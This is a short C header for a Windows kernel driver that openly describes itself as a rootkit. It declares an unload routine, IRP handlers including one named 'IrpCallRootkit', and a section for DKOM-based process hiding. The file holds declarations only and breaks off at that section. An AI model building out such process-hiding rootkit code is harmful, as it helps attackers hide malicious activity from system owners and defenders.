#pragma once
#include <stdio.h>
#include <stdlib.h>
#include <ntddk.h>
#include <winapifamily.h>
#include <wdf.h>


//------------------------------------------------------------------------------
//						Main Driver Functionality (driver.c)
//------------------------------------------------------------------------------

// Driver unload function
VOID DriverUnload(_In_ PDRIVER_OBJECT DriverObject);

//------------------------------------------------------------------------------
//						IRP Handlers (irphandlers.c)
//------------------------------------------------------------------------------

// Default IRP dispatcher
NTSTATUS defaultIrpHandler(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);

// IRP that calls our rootkit functionality
NTSTATUS IrpCallRootkit(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);

//------------------------------------------------------------------------------
//						DKOM Functionality (hideprocess.c)
//------------------------------------------------------------------------------